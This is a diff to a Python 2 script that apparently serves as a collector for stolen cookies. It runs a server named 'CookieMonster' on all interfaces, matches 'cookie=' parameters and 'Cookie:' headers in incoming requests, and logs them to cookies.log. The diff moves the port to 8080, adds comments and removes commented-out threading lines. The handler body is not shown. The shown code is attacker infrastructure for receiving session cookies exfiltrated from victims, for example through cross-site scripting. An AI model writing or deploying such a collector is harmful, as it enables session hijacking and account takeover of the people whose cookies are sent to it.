@@ -7,19 +7,22 @@ import threading
 import SocketServer
 
 address='0.0.0.0'
-port = 80
+port = 8080
 
+# Used to find the cookies in the messages
 cookie_re_raw='cookie=(.+?) HTTP/1.[0|1]'
 cookie2_re_raw='Cookie: (.+)'
 cookie_re = re.compile(cookie_re_raw)
 cookie2_re = re.compile(cookie2_re_raw)
 
+# If we collect a cookie it will go here
 cookie_jar = "cookies.log"
 collector_log="/var/www/collector_log.txt"
 
 log = None
 log_length = 0
 
+# Class that acts as a simple server to recieve messages and check for cookies
 class CookieMonster(SocketServer.BaseRequestHandler):
   def __init__(self, request, client_address, server):
     SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
@@ -85,9 +88,7 @@ if __name__ == '__main__':
 
   print("Starting collector on (addr={}, port={})".format(address, port))
   sendToLog("Starting collector on (addr={}, port={})\n".format(address,port))
+
   # Listen on the external interface
   server = SocketServer.TCPServer((address, port), CookieMonster)
   server.serve_forever()
-  #t = threading.Thread(target=server.serve_forever)
-  #t.setDaemon(True)
-  #t.start()
